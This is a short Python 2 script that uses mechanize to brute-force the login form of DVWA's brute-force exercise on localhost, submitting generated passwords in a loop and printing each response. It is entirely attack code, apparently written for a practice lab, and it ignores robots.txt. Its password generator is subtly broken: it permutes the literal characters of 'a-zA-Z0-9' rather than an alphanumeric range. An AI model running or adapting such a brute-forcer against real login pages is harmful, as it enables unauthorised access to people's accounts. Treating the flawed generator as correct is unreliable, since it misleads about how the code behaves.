import mechanize
import itertools

br = mechanize.Browser()
br.set_handle_equiv(True)
br.set_handle_redirect(True)
br.set_handle_referer(True)
br.set_handle_robots(False)


url = "http://127.0.0.1/dvwa/vulnerabilities/brute"
#url = 'http://testphp.acunetix.com/login.php'
#response = br.open(url)

pass_combi = itertools.permutations("a-zA-Z0-9",8)
br.open(url)
for x in pass_combi:
    br.select_form(nr=0)
    br.form['username']= 'user name'
    br.form['password'] = ''.join(x)
    print "Checking ",br.form['password']
    #br.method = "POST"
    response = br.submit()
    print response

